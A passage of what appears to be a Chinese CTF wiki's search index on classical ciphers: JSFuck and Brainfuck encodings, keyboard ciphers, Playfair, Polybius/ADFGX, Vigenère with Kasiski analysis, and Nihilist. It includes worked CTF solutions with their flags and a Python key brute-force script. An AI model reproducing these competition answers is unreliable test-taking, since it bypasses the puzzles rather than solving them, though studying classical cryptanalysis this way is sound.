Boolean => ! [] Function => [][ \"filter\" ] eval => [][ \"filter\" ][ \"constructor\" ]( CODE )() window => [][ \"filter\" ][ \"constructor\" ]( \"return this\" )()","title":"\u539f\u7406"},{"location":"crypto/classical/others/#_16","text":"JSFuck \u5728\u7ebf\u52a0\u5bc6\u7f51\u7ad9","title":"\u5de5\u5177"},{"location":"crypto/classical/others/#brainfuck","text":"","title":"BrainFuck"},{"location":"crypto/classical/others/#_17","text":"Brainfuck\uff0c\u662f\u4e00\u79cd\u6781\u5c0f\u5316\u7684\u8ba1\u7b97\u673a\u8bed\u8a00\uff0c\u5b83\u662f\u7531 Urban M\u00fcller \u5728 1993 \u5e74\u521b\u5efa\u7684\u3002\u6211\u4eec\u4e3e\u4e00\u4e2a\u4f8b\u5b50\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u4e00\u4e2a\u5728\u5c4f\u5e55\u4e0a\u6253\u5370Hello World\uff01\uff0c\u90a3\u4e48\u5bf9\u5e94\u7684\u7a0b\u5e8f\u5982\u4e0b\u3002\u5bf9\u4e8e\u5176\u4e2d\u7684\u539f\u7406\uff0c\u611f\u5174\u8da3\u7684\u53ef\u4ee5\u81ea\u884c\u7f51\u4e0a\u641c\u7d22\u3002 ++++++++++[>+++++++>++++++++++>+++>+<<<<-] >++.>+.+++++++..+++.>++.<<+++++++++++++++. >.+++.------.--------.>+.>. \u4e0e\u5176\u5bf9\u5e94\u7684\u8fd8\u6709 ook\u3002","title":"\u539f\u7406"},{"location":"crypto/classical/others/#_18","text":"https://www.splitbrain.org/services/ook","title":"\u5de5\u5177"},{"location":"crypto/classical/others/#_19","text":"","title":"\u732a\u5708\u5bc6\u7801"},{"location":"crypto/classical/others/#_20","text":"\u732a\u5708\u5bc6\u7801\u662f\u4e00\u79cd\u4ee5\u683c\u5b50\u4e3a\u57fa\u7840\u7684\u7b80\u5355\u66ff\u4ee3\u5f0f\u5bc6\u7801\uff0c\u683c\u5b50\u5982\u4e0b \u6211\u4eec\u4e3e\u4e00\u4e2a\u4f8b\u5b50\uff0c\u5982\u660e\u6587\u4e3a X marks the spot \uff0c\u90a3\u4e48\u5bc6\u6587\u5982\u4e0b","title":"\u539f\u7406"},{"location":"crypto/classical/others/#_21","text":"http://www.simonsingh.net/The_Black_Chamber/pigpen.html","title":"\u5de5\u5177"},{"location":"crypto/classical/others/#_22","text":"","title":"\u821e\u52a8\u7684\u5c0f\u4eba\u5bc6\u7801"},{"location":"crypto/classical/others/#_23","text":"\u8fd9\u79cd\u5bc6\u7801\u51fa\u81ea\u4e8e\u798f\u5c14\u6469\u65af\u63a2\u6848\u96c6\u3002\u6bcf\u4e00\u4e2a\u8df3\u821e\u7684\u5c0f\u4eba\u5b9e\u9645\u4e0a\u5bf9\u5e94\u7684\u662f\u82f1\u6587\u4e8c\u5341\u516d\u4e2a\u5b57\u6bcd\u4e2d\u7684\u4e00\u4e2a\uff0c\u800c\u5c0f\u4eba\u624b\u4e2d\u7684\u65d7\u5b50\u5219\u8868\u660e\u8be5\u5b57\u6bcd\u662f\u5355\u8bcd\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u6bcd\uff0c\u5982\u679c\u4ec5\u4ec5\u662f\u4e00\u4e2a\u5355\u8bcd\u800c\u4e0d\u662f\u53e5\u5b50\uff0c\u6216\u8005\u662f\u53e5\u5b50\u4e2d\u6700\u540e\u7684\u4e00\u4e2a\u5355\u8bcd\uff0c\u5219\u5355\u8bcd\u4e2d\u6700\u540e\u4e00\u4e2a\u5b57\u6bcd\u4e0d\u5fc5\u4e3e\u65d7\u3002","title":"\u539f\u7406"},{"location":"crypto/classical/others/#_24","text":"\u6240\u8c13\u952e\u76d8\u5bc6\u7801\uff0c\u5c31\u662f\u91c7\u7528\u624b\u673a\u952e\u76d8\u6216\u8005\u7535\u8111\u952e\u76d8\u8fdb\u884c\u52a0\u5bc6\u3002","title":"\u952e\u76d8\u5bc6\u7801"},{"location":"crypto/classical/others/#_25","text":"\u624b\u673a\u952e\u76d8\u52a0\u5bc6\u65b9\u5f0f\uff0c\u662f\u6bcf\u4e2a\u6570\u5b57\u952e\u4e0a\u6709 3-4 \u4e2a\u5b57\u6bcd\uff0c\u7528\u4e24\u4f4d\u6570\u5b57\u6765\u8868\u793a\u5b57\u6bcd\uff0c\u4f8b\u5982\uff1aru \u7528\u624b\u673a\u952e\u76d8\u8868\u793a\u5c31\u662f\uff1a7382\uff0c\u90a3\u4e48\u8fd9\u91cc\u5c31\u53ef\u4ee5\u77e5\u9053\u4e86\uff0c\u624b\u673a\u952e\u76d8\u52a0\u5bc6\u65b9\u5f0f\u4e0d\u53ef\u80fd\u7528 1 \u5f00\u5934\uff0c\u7b2c\u4e8c\u4f4d\u6570\u5b57\u4e0d\u53ef\u80fd\u8d85\u8fc7 4\uff0c\u89e3\u5bc6\u7684\u65f6\u5019\u53c2\u8003\u6b64 \u5173\u4e8e\u624b\u673a\u952e\u76d8\u52a0\u5bc6\u8fd8\u6709\u53e6\u4e00\u79cd\u65b9\u5f0f\uff0c\u5c31\u662f\u300c\u97f3\u7684\u300d\u5f0f\uff08\u8fd9\u4e00\u70b9\u53ef\u80fd\u6839\u636e\u624b\u673a\u7684\u4e0d\u540c\u4f1a\u6709\u6240\u4e0d\u540c\uff09\uff0c\u5177\u4f53\u53c2\u7167\u624b\u673a\u952e\u76d8\u6765\u6253\uff0c\u4f8b\u5982\uff1a\u300c\u6570\u5b57\u300d\u8868\u793a\u51fa\u6765\u5c31\u662f\uff1a748 94\u3002\u5728\u624b\u673a\u952e\u76d8\u4e0a\u9762\u6309\u4e0b\u8fd9\u51e0\u4e2a\u6570\uff0c\u5c31\u4f1a\u51fa\uff1a\u300c\u6570\u5b57\u300d\u7684\u62fc\u97f3\u3002","title":"\u624b\u673a\u952e\u76d8\u5bc6\u7801"},{"location":"crypto/classical/others/#_26","text":"\u7535\u8111\u952e\u76d8\u68cb\u76d8\u52a0\u5bc6\uff0c\u5229\u7528\u4e86\u7535\u8111\u7684\u68cb\u76d8\u65b9\u9635\u3002","title":"\u7535\u8111\u952e\u76d8\u68cb\u76d8"},{"location":"crypto/classical/others/#_27","text":"\u7535\u8111\u952e\u76d8\u5750\u6807\u52a0\u5bc6\uff0c\u5229\u7528\u952e\u76d8\u4e0a\u9762\u7684\u5b57\u6bcd\u884c\u548c\u6570\u5b57\u884c\u6765\u52a0\u5bc6\uff0c\u4f8b\uff1abye \u7528\u7535\u8111\u952e\u76d8 XY \u8868\u793a\u5c31\u662f\uff1a351613","title":"\u7535\u8111\u952e\u76d8\u5750\u6807"},{"location":"crypto/classical/others/#qwe","text":"\u7535\u8111\u952e\u76d8 QWE \u52a0\u5bc6\u6cd5\uff0c\u5c31\u662f\u7528\u5b57\u6bcd\u8868\u66ff\u6362\u952e\u76d8\u4e0a\u9762\u7684\u6392\u5217\u987a\u5e8f\u3002","title":"\u7535\u8111\u952e\u76d8 QWE"},{"location":"crypto/classical/others/#_28","text":"\u7b80\u5355\u5730\u8bf4\u5c31\u662f\u6839\u636e\u7ed9\u5b9a\u7684\u5b57\u7b26\u5728\u952e\u76d8\u4e0a\u7684\u6837\u5b50\u6765\u8fdb\u884c\u52a0\u5bc6\u3002","title":"\u952e\u76d8\u5e03\u5c40\u52a0\u5bc6"},{"location":"crypto/classical/others/#0ctf-2014-classic","text":"\u5c0f\u4e01\u4e01\u53d1\u73b0\u81ea\u5df1\u7f6e\u8eab\u4e8e\u4e00\u4e2a\u8be1\u5f02\u7684\u623f\u95f4\uff0c\u9762\u524d\u53ea\u6709\u4e00\u6247\u523b\u7740\u5947\u602a\u5b57\u7b26\u7684\u95e8\u3002 \u4ed6\u53d1\u73b0\u95e8\u8fb9\u4e0a\u8fd8\u6709\u4e00\u9053\u5bc6\u7801\u9501\uff0c\u4f3c\u4e4e\u8981\u8f93\u5165\u5bc6\u7801\u624d\u80fd\u5f00\u95e8\u3002\u30024esxcft5 rdcvgt 6tfc78uhg 098ukmnb \u53d1\u73b0\u8fd9\u4e48\u4e71\uff0c\u8fd8\u540c\u65f6\u5305\u62ec\u6570\u5b57\u548c\u5b57\u6bcd\u731c\u60f3\u53ef\u80fd\u662f\u952e\u76d8\u5bc6\u7801\uff0c\u8bd5\u7740\u5728\u952e\u76d8\u4e0a\u6309\u7167\u5b57\u6bcd\u987a\u5e8f\u63cf\u7ed8\u4e00\u4e0b\uff0c\u53ef\u5f97\u52300ops\u5b57\u6837\uff0c\u731c\u6d4b\u5c31\u662fflag\u4e86\u3002","title":"0CTF 2014 classic"},{"location":"crypto/classical/others/#2017xman","text":"\u6211\u6570123\u6728\u5934\u4eba\uff0c\u518d\u4e0d\u884c\u52a8\u5c31\u8981\u88ab\u6263\u5206\u3002 23731263111628163518122316391715262121 \u5bc6\u7801\u683c\u5f0fxman{flag} \u9898\u76ee\u4e2d\u6709\u5f88\u660e\u663e\u7684\u63d0\u793a123\uff0c\u90a3\u4e48\u5c31\u81ea\u7136\u9700\u8981\u8054\u60f3\u5230\u952e\u76d8\u5bc6\u7801\u4e2d\u7535\u8111\u952e\u76d8\u5750\u6807\u5bc6\u7801\uff0c\u53ef\u4ee5\u53d1\u73b0\u524d\u51e0\u4e2a\u6570\u5b57\u7b2c\u4e8c\u4e2a\u6570\u5b57\u90fd\u662f1-3\u8303\u56f4\u5185\u7684\uff0c\u4e5f\u9a8c\u8bc1\u4e86\u6211\u4eec\u7684\u731c\u6d4b\u3002\u4e8e\u662f 23-x 73-m 12-a 63-n 11-q \u4e0d\u5bf9\u5440\uff0c\u5bc6\u7801\u683c\u5f0f\u662f xman{ \uff0c\u7b2c\u56db\u4e2a\u5b57\u7b26\u662f { \uff0c\u4e8e\u662f\u770b\u4e86\u770b { \u7684\u4f4d\u7f6e\uff0c\u5176\u5e76\u6ca1\u6709\u5bf9\u5e94\u7684\u6a2a\u5750\u6807\uff0c\u4f46\u662f\u5982\u679c\u6211\u4eec\u624b\u52a8\u628a\u5b83\u89c6\u4e3a 11 \u7684\u8bdd\uff0c\u90a3\u4e48111\u5c31\u662f { \u3002\u7136\u540e\u4f9d\u6b21\u5f80\u540e\u63a8\uff0c\u53d1\u73b0\u786e\u5b9e\u53ef\u884c\uff0c\uff0c\u6700\u540e\u518d\u628a 121 \u89c6\u4e3a } \u5373\u53ef\u5f97\u5230 flag\u3002 xman{hintisenough} \u4ece\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u8fd8\u662f\u8981\u6ce8\u610f\u8fc1\u79fb\u6027\uff0c\u4e0d\u80fd\u5355\u7eaf\u5730\u7167\u642c\u4e00\u4e9b\u5df2\u6709\u7684\u77e5\u8bc6\u3002","title":"2017\u5e74xman\u9009\u62d4\u8d5b\u2014\u2014\u4e00\u4e8c\u4e09\uff0c\u6728\u5934\u4eba"},{"location":"crypto/classical/others/#_29","text":"\u5b9e\u9a8c\u5427 \u5947\u602a\u7684\u77ed\u4fe1","title":"\u9898\u76ee"},{"location":"crypto/classical/polyalphabetic/","text":"\u591a\u8868\u4ee3\u6362\u52a0\u5bc6 \u00b6 \u5bf9\u4e8e\u591a\u8868\u66ff\u6362\u52a0\u5bc6\u6765\u8bf4\uff0c\u52a0\u5bc6\u540e\u7684\u5b57\u6bcd\u51e0\u4e4e\u4e0d\u518d\u4fdd\u6301\u539f\u6765\u7684\u9891\u7387\uff0c\u6240\u4ee5\u6211\u4eec\u4e00\u822c\u53ea\u80fd\u901a\u8fc7\u5bfb\u627e\u7b97\u6cd5\u5b9e\u73b0\u5bf9\u5e94\u7684\u5f31\u70b9\u8fdb\u884c\u7834\u89e3\u3002 Playfair \u00b6 \u539f\u7406 \u00b6 Playfair \u5bc6\u7801\uff08Playfair cipher or Playfair square\uff09\u662f\u4e00\u79cd\u66ff\u6362\u5bc6\u7801\uff0c1854 \u5e74\u7531\u82f1\u56fd\u4eba\u67e5\u5c14\u65af\u00b7\u60e0\u65af\u901a\uff08Charles Wheatstone\uff09\u53d1\u660e\uff0c\u57fa\u672c\u7b97\u6cd5\u5982\u4e0b\uff1a \u9009\u53d6\u4e00\u4e32\u82f1\u6587\u5b57\u6bcd\uff0c\u9664\u53bb\u91cd\u590d\u51fa\u73b0\u7684\u5b57\u6bcd\uff0c\u5c06\u5269\u4e0b\u7684\u5b57\u6bcd\u9010\u4e2a\u9010\u4e2a\u52a0\u5165 5 \u00d7 5 \u7684\u77e9\u9635\u5185\uff0c\u5269\u4e0b\u7684\u7a7a\u95f4\u7531\u672a\u52a0\u5165\u7684\u82f1\u6587\u5b57\u6bcd\u4f9d a-z \u7684\u987a\u5e8f\u52a0\u5165\u3002\u6ce8\u610f\uff0c\u5c06 q \u53bb\u9664\uff0c\u6216\u5c06 i \u548c j \u89c6\u4f5c\u540c\u4e00\u5b57\u3002 \u5c06\u8981\u52a0\u5bc6\u7684\u660e\u6587\u5206\u6210\u4e24\u4e2a\u4e00\u7ec4\u3002\u82e5\u7ec4\u5185\u7684\u5b57\u6bcd\u76f8\u540c\uff0c\u5c06 X\uff08\u6216 Q\uff09\u52a0\u5230\u8be5\u7ec4\u7684\u7b2c\u4e00\u4e2a\u5b57\u6bcd\u540e\uff0c\u91cd\u65b0\u5206\u7ec4\u3002\u82e5\u5269\u4e0b\u4e00\u4e2a\u5b57\uff0c\u4e5f\u52a0\u5165 X \u3002 \u5728\u6bcf\u7ec4\u4e2d\uff0c\u627e\u51fa\u4e24\u4e2a\u5b57\u6bcd\u5728\u77e9\u9635\u4e2d\u7684\u5730\u65b9\u3002 \u82e5\u4e24\u4e2a\u5b57\u6bcd\u4e0d\u540c\u884c\u4e5f\u4e0d\u540c\u5217\uff0c\u5728\u77e9\u9635\u4e2d\u627e\u51fa\u53e6\u5916\u4e24\u4e2a\u5b57\u6bcd\uff08\u7b2c\u4e00\u4e2a\u5b57\u6bcd\u5bf9\u5e94\u884c\u4f18\u5148\uff09\uff0c\u4f7f\u8fd9\u56db\u4e2a\u5b57\u6bcd\u6210\u4e3a\u4e00\u4e2a\u957f\u65b9\u5f62\u7684\u56db\u4e2a\u89d2\u3002 \u82e5\u4e24\u4e2a\u5b57\u6bcd\u540c\u884c\uff0c\u53d6\u8fd9\u4e24\u4e2a\u5b57\u6bcd\u53f3\u65b9\u7684\u5b57\u6bcd\uff08\u82e5\u5b57\u6bcd\u5728\u6700\u53f3\u65b9\u5219\u53d6\u6700\u5de6\u65b9\u7684\u5b57\u6bcd\uff09\u3002 \u82e5\u4e24\u4e2a\u5b57\u6bcd\u540c\u5217\uff0c\u53d6\u8fd9\u4e24\u4e2a\u5b57\u6bcd\u4e0b\u65b9\u7684\u5b57\u6bcd\uff08\u82e5\u5b57\u6bcd\u5728\u6700\u4e0b\u65b9\u5219\u53d6\u6700\u4e0a\u65b9\u7684\u5b57\u6bcd\uff09\u3002 \u65b0\u627e\u5230\u7684\u4e24\u4e2a\u5b57\u6bcd\u5c31\u662f\u539f\u672c\u7684\u4e24\u4e2a\u5b57\u6bcd\u52a0\u5bc6\u7684\u7ed3\u679c\u3002 \u4ee5 playfair example \u4e3a\u5bc6\u5319\uff0c\u5f97 P L A Y F I R E X M B C D G H K N O Q S T U V W Z \u8981\u52a0\u5bc6\u7684\u8baf\u606f\u4e3a Hide the gold in the tree stump HI DE TH EG OL DI NT HE TR EX ES TU MP \u5c31\u4f1a\u5f97\u5230 BM OD ZB XD NA BE KU DM UI XM MO UV IF \u5de5\u5177 \u00b6 CAP4 Polybius \u00b6 \u539f\u7406 \u00b6 Polybius\u5bc6\u7801\u53c8\u79f0\u4e3a\u68cb\u76d8\u5bc6\u7801\uff0c\u5176\u4e00\u822c\u662f\u5c06\u7ed9\u5b9a\u7684\u660e\u6587\u52a0\u5bc6\u4e3a\u4e24\u4e24\u7ec4\u5408\u7684\u6570\u5b57\uff0c\u5176\u5e38\u7528\u5bc6\u7801\u8868 1 2 3 4 5 1 A B C D E 2 F G H I/J K 3 L M N O P 4 Q R S T U 5 V W X Y Z \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u660e\u6587 HELLO\uff0c\u52a0\u5bc6\u540e\u5c31\u662f 23 15 31 31 34\u3002 \u53e6\u4e00\u79cd\u5bc6\u7801\u8868 A D F G X A b t a l p D d h o z k F q f v s n G g j c u x X m r e w y \u6ce8\u610f\uff0c\u8fd9\u91cc\u5b57\u6bcd\u7684\u987a\u5e8f\u88ab\u6253\u4e71\u4e86\u3002 A D F G X \u7684\u7531\u6765\uff1a 1918 \u5e74\uff0c\u7b2c\u4e00\u6b21\u4e16\u754c\u5927\u6218\u5c06\u8981\u7ed3\u675f\u65f6\uff0c\u6cd5\u519b\u622a\u83b7\u4e86\u4e00\u4efd\u5fb7\u519b\u7535\u62a5\uff0c\u7535\u6587\u4e2d\u7684\u6240\u6709\u5355\u8bcd\u90fd\u7531 A\u3001D\u3001F\u3001G\u3001X \u4e94\u4e2a\u5b57\u6bcd\u62fc\u6210\uff0c\u56e0\u6b64\u88ab\u79f0\u4e3a ADFGX \u5bc6\u7801\u3002ADFGX \u5bc6\u7801\u662f 1918 \u5e74 3 \u6708\u7531\u5fb7\u519b\u4e0a\u6821 Fritz Nebel \u53d1\u660e\u7684\uff0c\u662f\u7ed3\u5408\u4e86 Polybius \u5bc6\u7801\u548c\u7f6e\u6362\u5bc6\u7801\u7684\u53cc\u91cd\u52a0\u5bc6\u65b9\u6848\u3002 \u4e3e\u4e2a\u4f8b\u5b50\uff0cHELLO\uff0c\u4f7f\u7528\u8fd9\u4e2a\u8868\u683c\u52a0\u5bc6\uff0c\u5c31\u662f DD XF AG AG DF\u3002 \u5de5\u5177 \u00b6 CrypTool \u4f8b\u5b50 \u00b6 \u8fd9\u91cc\u4ee5\u5b89\u6052\u676f 9 \u6708 Crypto \u8d5b\u9898 Go \u4e3a\u4f8b\uff0c\u9898\u76ee\u4e3a\uff1a \u5bc6\u6587\uff1ailnllliiikkninlekile \u538b\u7f29\u5305\u7ed9\u4e86\u4e00\u884c\u5341\u516d\u8fdb\u5236\uff1a546865206c656e677468206f66207468697320706c61696e746578743a203130 \u8bf7\u5bf9\u5bc6\u6587\u89e3\u5bc6 \u9996\u5148\u5bf9\u5341\u516d\u8fdb\u5236\u8fdb\u884c hex \u89e3\u7801\uff0c\u5f97\u5230\u5b57\u7b26\u4e32\uff1a\"The length of this plaintext: 10\" \u5bc6\u6587\u957f\u5ea6\u4e3a 20 \uff0c\u800c\u660e\u6587\u957f\u5ea6\u4e3a 10 \uff0c\u5bc6\u6587\u53ea\u6709 \" l \",\" i \",\" n \",\" k \",\" e \" \u8fd9\u4e94\u4e2a\u5b57\u7b26\uff0c\u8054\u60f3\u5230\u68cb\u76d8\u5bc6\u7801\u3002 \u9996\u5148\u8bd5\u4e00\u4e0b\u4e94\u4e2a\u5b57\u7b26\u6309\u5b57\u6bcd\u8868\u987a\u5e8f\u6392\u5217\uff1a e i k l n e A B C D E i F G H I/J K k L M N O P l Q R S T U n V W X Y Z \u6839\u636e\u5bc6\u6587\u89e3\u5bc6\u5f97\uff1aiytghpkqmq\u3002 \u8fd9\u5e94\u8be5\u4e0d\u662f\u6211\u4eec\u60f3\u8981\u7684 flag \u7b54\u6848\u3002 \u770b\u6765\u8fd9\u4e94\u4e2a\u5b57\u7b26\u6392\u5217\u4e0d\u662f\u8fd9\u4e48\u6392\u5217\u7684\uff0c\u4e00\u5171\u6709 5! \u79cd\u60c5\u51b5\uff0c\u5199\u811a\u672c\u7206\u7834\uff1a import itertools key = [] cipher = \"ilnllliiikkninlekile\" for i in itertools . permutations ( 'ilnke' , 5 ): key . append ( '' . join ( i )) for now_key in key : solve_c = \"\" res = \"\" for now_c in cipher : solve_c += str ( now_key . index ( now_c )) for i in range ( 0 , len ( solve_c ), 2 ): now_ascii = int ( solve_c [ i ]) * 5 + int ( solve_c [ i + 1 ]) + 97 if now_ascii > ord ( 'i' ): now_ascii += 1 res += chr ( now_ascii ) if \"flag\" in res : print now_key , res \u811a\u672c\u5176\u5b9e\u5c31\u662f\u5b9e\u73b0\u68cb\u76d8\u5bc6\u7801\u8fd9\u4e2a\u7b97\u6cd5\uff0c\u53ea\u662f\u8fd9\u4e94\u4e2a\u5b57\u7b26\u7684\u987a\u5e8f\u4e0d\u5b9a\u3002 \u8dd1\u51fa\u4e0b\u9762\u4e24\u4e2a\u7ed3\u679c\uff1a linke flagishere linek flagkxhdwd \u663e\u7136\u7b2c\u4e00\u4e2a\u662f\u6211\u4eec\u60f3\u8981\u7684\u7b54\u6848\u3002 \u9644\u4e0a\u6b63\u786e\u7684\u5bc6\u7801\u8868\uff1a l i n k e l A B C D E i F G H I/J K n L M N O P k Q R S T U e V W X Y Z Vigenere \u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801 \u00b6 \u539f\u7406 \u00b6 \u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\uff08Vigenere\uff09\u662f\u4f7f\u7528\u4e00\u7cfb\u5217\u51ef\u6492\u5bc6\u7801\u7ec4\u6210\u5bc6\u7801\u5b57\u6bcd\u8868\u7684\u52a0\u5bc6\u7b97\u6cd5\uff0c\u5c5e\u4e8e\u591a\u8868\u5bc6\u7801\u7684\u4e00\u79cd\u7b80\u5355\u5f62\u5f0f\u3002 \u4e0b\u9762\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50 \u660e\u6587\uff1acome greatwall \u5bc6\u94a5\uff1acrypto \u9996\u5148\uff0c\u5bf9\u5bc6\u94a5\u8fdb\u884c\u586b\u5145\u4f7f\u5176\u957f\u5ea6\u4e0e\u660e\u6587\u957f\u5ea6\u4e00\u6837\u3002 \u660e\u6587 c o m e g r e a t w a l l \u5bc6\u94a5 c r y p t o c r y p t o c \u5176\u6b21\uff0c\u67e5\u8868\u5f97\u5bc6\u6587 \u660e\u6587\uff1acome greatwall \u5bc6\u94a5\uff1acrypto \u5bc6\u6587\uff1aefkt zferrltzn \u7834\u89e3 \u00b6 \u5bf9\u5305\u62ec\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u5728\u5185\u7684\u6240\u6709\u591a\u8868\u5bc6\u7801\u7684\u7834\u8bd1\u90fd\u662f\u4ee5\u5b57\u6bcd\u9891\u7387\u4e3a\u57fa\u7840\u7684\uff0c\u4f46\u76f4\u63a5\u7684\u9891\u7387\u5206\u6790\u5374\u5e76\u4e0d\u9002\u7528\uff0c\u8fd9\u662f\u56e0\u4e3a\u5728\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u4e2d\uff0c\u4e00\u4e2a\u5b57\u6bcd\u53ef\u4ee5\u88ab\u52a0\u5bc6\u6210\u4e0d\u540c\u7684\u5bc6\u6587\uff0c\u56e0\u800c\u7b80\u5355\u7684\u9891\u7387\u5206\u6790\u5728\u8fd9\u91cc\u5e76\u6ca1\u6709\u7528\u3002 \u7834\u8bd1\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u7684\u5173\u952e\u5728\u4e8e\u5b83\u7684\u5bc6\u94a5\u662f\u5faa\u73af\u91cd\u590d\u7684\u3002 \u5982\u679c\u6211\u4eec\u77e5\u9053\u4e86\u5bc6\u94a5\u7684\u957f\u5ea6\uff0c\u90a3\u5bc6\u6587\u5c31\u53ef\u4ee5\u88ab\u770b\u4f5c\u662f\u4ea4\u7ec7\u5728\u4e00\u8d77\u7684\u51ef\u6492\u5bc6\u7801\uff0c\u800c\u5176\u4e2d\u6bcf\u4e00\u4e2a\u90fd\u53ef\u4ee5\u5355\u72ec\u7834\u89e3\u3002\u5173\u4e8e\u5bc6\u7801\u7684\u957f\u5ea6\uff0c\u6211\u4eec\u53ef\u4ee5 \u4f7f\u7528\u5361\u897f\u65af\u57fa\u8bd5\u9a8c\u548c\u5f17\u91cc\u5fb7\u66fc\u8bd5\u9a8c\u6765\u83b7\u53d6\u3002 \u5361\u897f\u65af\u57fa\u8bd5\u9a8c\u662f\u57fa\u4e8e\u7c7b\u4f3c the \u8fd9\u6837\u7684\u5e38\u7528\u5355\u8bcd\u6709\u53ef\u80fd\u88ab\u540c\u6837\u7684\u5bc6\u94a5\u5b57\u6bcd\u8fdb\u884c\u52a0\u5bc6\uff0c\u4ece\u800c\u5728\u5bc6\u6587\u4e2d\u91cd\u590d\u51fa\u73b0\u3002\u4f8b\u5982\uff0c\u660e\u6587\u4e2d\u4e0d\u540c\u7684 CRYPTO \u53ef\u80fd\u88ab\u5bc6\u94a5 ABCDEF \u52a0\u5bc6\u6210\u4e0d\u540c\u7684\u5bc6\u6587\uff1a \u5bc6\u94a5\uff1aABCDEF AB CDEFA BCD EFABCDEFABCD \u660e\u6587\uff1aCRYPTO IS SHORT FOR CRYPTOGRAPHY \u5bc6\u6587\uff1aCSASXT IT UKSWT GQU GWYQVRKWAQJB \u6b64\u65f6\u660e\u6587\u4e2d\u91cd\u590d\u7684\u5143\u7d20\u5728\u5bc6\u6587\u4e2d\u5e76\u4e0d\u91cd\u590d\u3002\u7136\u800c\uff0c\u5982\u679c\u5bc6\u94a5\u76f8\u540c\u7684\u8bdd\uff0c\u7ed3\u679c\u53ef\u80fd\u4fbf\u4e3a\uff08\u4f7f\u7528\u5bc6\u94a5 ABCD\uff09\uff1a \u5bc6\u94a5\uff1aABCDAB CD ABCDA BCD ABCDABCDABCD \u660e\u6587\uff1aCRYPTO IS SHORT FOR CRYPTOGRAPHY \u5bc6\u6587\uff1aCSASTP KV SIQUT GQU CSASTPIUAQJB \u6b64\u65f6\u5361\u897f\u65af\u57fa\u8bd5\u9a8c\u5c31\u80fd\u4ea7\u751f\u6548\u679c\u3002\u5bf9\u4e8e\u66f4\u957f\u7684\u6bb5\u843d\u6b64\u65b9\u6cd5\u66f4\u4e3a\u6709\u6548\uff0c\u56e0\u4e3a\u901a\u5e38\u5bc6\u6587\u4e2d\u91cd\u590d\u7684\u7247\u6bb5\u4f1a\u66f4\u591a\u3002\u5982\u901a\u8fc7\u4e0b\u9762\u7684\u5bc6\u6587\u5c31\u80fd\u7834\u8bd1\u51fa\u5bc6\u94a5\u7684\u957f\u5ea6\uff1a \u5bc6\u6587\uff1aDYDUXRMHTVDVNQDQNWDYDUXRMHARTJGWNQD \u5176\u4e2d\uff0c\u4e24\u4e2a DYDUXRMH \u7684\u51fa\u73b0\u76f8\u9694\u4e86 18 \u4e2a\u5b57\u6bcd\u3002\u56e0\u6b64\uff0c\u53ef\u4ee5\u5047\u5b9a\u5bc6\u94a5\u7684\u957f\u5ea6\u662f 18 \u7684\u7ea6\u6570\uff0c\u5373\u957f\u5ea6\u4e3a 18\u30019\u30016\u30013 \u6216 2\u3002\u800c\u4e24\u4e2a NQD \u5219\u76f8\u8ddd 20 \u4e2a\u5b57\u6bcd\uff0c\u610f\u5473\u7740\u5bc6\u94a5\u957f\u5ea6\u5e94\u4e3a 20\u300110\u30015\u30014 \u6216 2\u3002\u53d6\u4e24\u8005\u7684\u4ea4\u96c6\uff0c\u5219\u53ef\u4ee5\u57fa\u672c\u786e\u5b9a\u5bc6\u94a5\u957f\u5ea6\u4e3a 2\u3002\u63a5\u4e0b\u6765\u5c31\u662f\u8fdb\u884c\u8fdb\u4e00\u6b65\u7684\u64cd\u4f5c\u4e86\u3002 \u5173\u4e8e\u66f4\u52a0\u8be6\u7ec6\u7684\u7834\u89e3\u539f\u7406\uff0c\u8fd9\u91cc\u6682\u65f6\u4e0d\u505a\u8fc7\u591a\u7684\u4ecb\u7ecd\u3002\u53ef\u4ee5\u53c2\u8003http:// www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-vigenere-cipher/ \u3002 \u5de5\u5177 \u00b6 \u5df2\u77e5\u5bc6\u94a5 Python \u7684 pycipher \u5e93 \u5728\u7ebf\u89e3\u5bc6 Vigen\u00e8re cipher CAP4 \u672a\u77e5\u5bc6\u94a5 Vigen\u00e8re Cipher Codebreaker Vigenere Solver \uff0c\u4e0d\u591f\u5b8c\u5584\u3002 Nihilist \u00b6 \u539f\u7406 \u00b6 Nihilist\u5bc6\u7801\u53c8\u79f0\u5173\u952e\u5b57\u5bc6\u7801\uff1a\u660e\u6587 + \u5173\u952e\u5b57 = \u5bc6\u6587\u3002\u4ee5\u5173\u952e\u5b57 helloworld \u4e3a\u4f8b\u3002 \u9996\u5148\u5229\u7528\u5bc6\u94a5\u6784\u9020\u68cb\u76d8\u77e9\u9635\uff08\u7c7b\u4f3c Polybius \u5bc6\u7801\uff09 - \u65b0\u5efa\u4e00\u4e2a 5 \u00d7 5 \u77e9\u9635 - \u5c06\u5b57\u7b26\u4e0d\u91cd\u590d\u5730\u4f9d\u6b21\u586b\u5165\u77e9\u9635 - \u5269\u4e0b\u90e8\u5206\u6309\u5b57\u6bcd\u987a\u5e8f\u586b\u5165 - \u5b57\u6bcd i \u548c j \u7b49\u4ef7 1 2 3 4 5 1 h e l o w 2 r d a b c 3 f g i / j k m 4 n p q s t 5 u v x y z \u5bf9\u4e8e\u52a0\u5bc6\u8fc7\u7a0b\u53c2\u7167\u77e9\u9635 M \u8fdb\u884c\u52a0\u5bc6\uff1a a -> M[2,3] -> 23 t -> M[4,5] -> 45 \u5bf9\u4e8e\u89e3\u5bc6\u8fc7\u7a0b \u53c2\u7167\u77e9\u9635 M \u8fdb\u884c\u89e3\u5bc6\uff1a 23 -> M[2,3] -> a 45 -> M[4,5] -> t \u53ef\u4ee5\u770b\u51fa\uff0c\u5bc6\u6587\u7684\u7279\u5f81\u6709\u5982\u4e0b\u51e0\u70b9 \u7eaf\u6570\u5b57 \u53ea\u5305\u542b 1 \u5230 5 \u5bc6\u6587\u957f\u5ea6\u5076\u6570\u3002 Hill \u00b6 \u539f\u7406 \u00b6 